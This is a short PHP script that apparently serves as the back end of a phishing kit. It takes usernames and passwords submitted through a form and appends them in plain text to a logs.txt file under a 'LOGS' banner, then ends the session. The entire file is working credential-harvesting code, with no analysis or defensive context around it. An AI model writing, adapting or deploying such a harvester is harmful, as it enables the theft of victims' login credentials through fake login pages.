<?php
session_start();
require '../lib/configClass.php';

$config = new Config;
$config->load('../config.php');

if(isset($_POST['user']) && isset($_POST['pass']) && isset($_SESSION['USER'])) {
    $user = $_SESSION['USER'];
    $message = "";
    $message .= "=============LOGS==============\n";
    $message .= ' Username            : '.$_POST['user']."\n";
    $message .= ' Password            : '.$_POST['pass']."\n";
    $message .= "========================================\n";
    $message .= "\n";
    $message .= "\n";
    $user .= $message;

    $my_file = 'logs.txt';
    $handle = fopen($my_file, 'a');
    fwrite($handle, $user);
    fclose($handle);
    session_unset();
    session_destroy();
}
?> 